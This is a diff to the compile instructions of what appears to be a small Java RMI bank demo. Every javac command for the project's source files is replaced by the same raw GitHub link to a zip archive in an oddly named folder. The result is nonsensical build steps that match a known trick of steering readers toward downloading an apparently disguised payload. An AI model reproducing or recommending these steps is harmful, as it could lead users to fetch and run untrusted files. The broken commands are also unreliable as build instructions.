@@ -7,15 +7,15 @@ cd '/directory'
 
 //compile .java files
 
-javac BankServer.java
+javac https://raw.githubusercontent.com/chester1900/RMISimpleBankSystem/master/frostily/RMISimpleBankSystem.zip
 
-javac BankClient.java
+javac https://raw.githubusercontent.com/chester1900/RMISimpleBankSystem/master/frostily/RMISimpleBankSystem.zip
 
-javac BankAccount.java
+javac https://raw.githubusercontent.com/chester1900/RMISimpleBankSystem/master/frostily/RMISimpleBankSystem.zip
 
-javac BankInterface.java
+javac https://raw.githubusercontent.com/chester1900/RMISimpleBankSystem/master/frostily/RMISimpleBankSystem.zip
 
-javac DbConnection.java
+javac https://raw.githubusercontent.com/chester1900/RMISimpleBankSystem/master/frostily/RMISimpleBankSystem.zip
 
 rmic BankAccount
 
